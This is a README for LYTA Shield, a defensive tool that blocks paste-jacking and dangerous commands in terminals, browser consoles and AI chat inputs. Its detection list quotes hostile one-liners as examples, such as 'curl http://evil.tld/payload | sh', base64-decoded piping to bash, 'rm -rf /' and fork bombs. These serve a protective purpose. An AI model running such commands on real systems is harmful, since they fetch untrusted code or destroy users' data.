# LYTA Shield 🛡

An all-in-one, lightweight defense against **paste-jacking**, **social-engineering attacks**, and malicious code execution across:

- 💻 **Terminal** (zsh / bash)
- 🔍 **Browser DevTools console**
- 🧠 **AI chat inputs** (ChatGPT, Claude, Gemini, etc.)

One wrong paste can compromise your entire machine. LYTA Shield intercepts the dangerous text **before it executes**.

---

## What it catches

- `echo "BASE64" | base64 -d | bash`
- `curl http://evil.tld/payload | sh`
- obfuscated `python3 -c`, `perl -e`, `ruby -e`, `node -e` payloads
- reverse shells
- destructive commands (`rm -rf /`, `mkfs`, fork bombs)
- social-engineering instructions like "copy this into your terminal"
- browser `eval()`, `document.write()`, `fetch()` to remote URLs
- `localStorage` / `sessionStorage` / `process.env` key theft
- pasted malicious code in AI chat prompts

---

## What it allows

- `ls`, `git push`, `cd`, normal `python` scripts, etc.
- Known safe installers are **downgraded to confirmation**, not blocked:
  - `https://hermes-agent.nousresearch.com/install.sh`
  - `https://ollama.com/install.sh`
  - `https://x.ai/cli/install.sh`
  - `https://sh.rustup.rs`
  - `https://brew.sh/...`

---

## Install

### Terminal guard

```bash
curl -fsSL https://raw.githubusercontent.com/Kubo-cmd/lyta-shield/main/install.sh | bash
```

Then start a new shell.

### Browser + AI chat guard

1. Install [Tampermonkey](https://www.tampermonkey.net/).
2. Install the userscript: `extensions/browser/lyta_shield_console_guard.user.js`
   - Click it in the repo, then click **Raw**.

---

## Usage

### Terminal

```bash
# Check a single command
python3 ~/.config/lyta-shield/lyta_shield.py --check "echo foo | base64 -d | bash"

# Scan your shell history
python3 ~/.config/lyta-shield/lyta_shield.py --batch ~/.zsh_history

# Bypass (only when you are sure)
LYTA_SHIELD_DISABLE=1 curl -fsSL https://example.com/install.sh | bash
```

### Browser

The userscript auto-activates on all websites. It will:
- Warn you when pasting dangerous code into AI chat inputs.
- Block `eval()` of dangerous code on the page.

---

## Exit codes

- `0` — safe
- `1` — suspicious, requires confirmation
- `2` — dangerous, blocked

---

## Architecture

```
lyta-shield/
├── src/
│   ├── rules.json              # editable rules: blocked, suspicious, safe_installers
│   ├── rules_engine.py         # shared classification engine
│   ├── lyta_shield.py          # terminal CLI
│   └── lyta_shield_hook.sh     # zsh / bash shell hook
├── extensions/
│   ├── browser/                # Tampermonkey userscript
│   └── ai-chat/                # AI chat input guard (part of userscript)
├── tests/
├── docs/
│   ├── index.html              # GitHub Pages landing page
│   └── pipeline.svg
├── install.sh
├── README.md
└── LICENSE
```

A single JSON rule engine powers the terminal CLI, the browser userscript, and AI chat input guards. Add or modify rules without touching code.

![pipeline](docs/pipeline.svg)

---

## Tests

```bash
cd lyta-shield
python3 tests/test_lyta_shield_rules.py
python3 tests/lyta_shield_simulate.py
```

**Simulation:** 1,000,000 generated calls against a synthetic fuzz harness. This is a regression smoke test, not a real-world security guarantee. The 100% score means the current rules cover the templates we generate; it does not mean LYTA Shield has "solved" paste-jacking or that real attackers cannot bypass it.

Real validation requires red-team review, bug bounty, and production use.

---

## Supported shells

- `zsh` (via `preexec` hook)
- `bash` (via `DEBUG` trap)

---

## Integrations

- **Hermes / AI output guard**: `integrations/hermes_guard.py` lets any AI assistant (including Hermes) check its own outputs before rendering them to the user. See [integrations/README.md](integrations/README.md).

---

## Integrations

- **Hermes / AI output guard**: `integrations/hermes_guard.py` checks AI assistant outputs before they reach the user. It supports `text`, `file`, `stdin`, `json`, and a shell wrapper `hermes-wrapper.sh`. There is also a chat-log audit script, `hermes-chat-audit.py`. See [integrations/README.md](integrations/README.md).
- **CI**: Every PR and push to `main` runs adversarial bypass tests via GitHub Actions.

---

## Real validation

The 1,000,000-call simulation is a **synthetic fuzz regression test**, not a security guarantee. If you find a bypass or false positive, please open a [GitHub Security Advisory](https://github.com/Kubo-cmd/lyta-shield/security/advisories) or add a test case to `tests/test_adversarial_bypass.py`.

See [SECURITY.md](SECURITY.md) for the full disclosure policy.

---

## Citation

```bibtex
@software{lytashield2026,
  title = {LYTA Shield: Paste-Jacking and AI Chat Defense},
  author = {LYTA.EXE},
  year = {2026},
  url = {https://github.com/Kubo-cmd/lyta-shield}
}
```

---

## License

MIT — Copyright (c) 2026 Kubo-cmd

---

## Credits

Built by LYTA.EXE after a real paste-jacking incident. Share it. Guard your friends.
